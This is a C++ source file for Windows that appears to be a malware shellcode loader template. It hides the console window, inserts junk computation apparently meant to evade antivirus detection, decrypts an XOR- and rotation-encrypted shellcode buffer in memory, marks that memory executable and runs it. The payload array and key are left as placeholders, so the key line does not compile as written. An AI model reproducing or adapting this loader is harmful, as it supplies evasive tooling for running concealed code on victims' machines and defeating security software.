#include <iostream>
#include <string.h>
#include <windows.h>
#include <cmath>
#include <cstdint>

unsigned char encripted_shellcode[] = {
   //i will insert my encripted code here
};
uint32_t key = //your key;
size_t shellSz = sizeof(encripted_shellcode);
unsigned char rotate_left(unsigned char val, int shift) {
    shift %= 8;
    return (val << shift) | (val >> (8 - shift));
}

unsigned char hello(uint32_t k , size_t x){

    
    

    unsigned char roll_key = static_cast<unsigned char>(k & 0xFF);

roll_key = rotate_left(roll_key ^ x, x % 7);
         
  
    return roll_key;






}
void junk_f(){

    double x = 10.7;
    for (int i = 0; i < 100; i++) {
        x = std::sin(x) +std::cos(x);
        if (x > 1000) ;
    }
}

int main() {

      HWND Window = GetConsoleWindow();
  ShowWindow(Window, SW_HIDE);



    junk_f();

    // this line allocated memory for shellcode
    void* exec = nullptr;
     exec = VirtualAlloc(0, sizeof(encripted_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     junk_f();
    unsigned char* buffer = (unsigned char*) exec;
    for(size_t i=0 ; i < shellSz ; ++i){

        int junk_value = (i * 123) % 456;

      buffer[i] = ( encripted_shellcode[i] ^ hello(key , i));
        if(junk_value==999) break;
       
    }
    junk_f();
    
    DWORD Protect;
    VirtualProtect(exec, shellSz, PAGE_EXECUTE_READ, &Protect);
   junk_f();
    
    // executing the code
    ((void(*)())exec)();
    return 0;
}
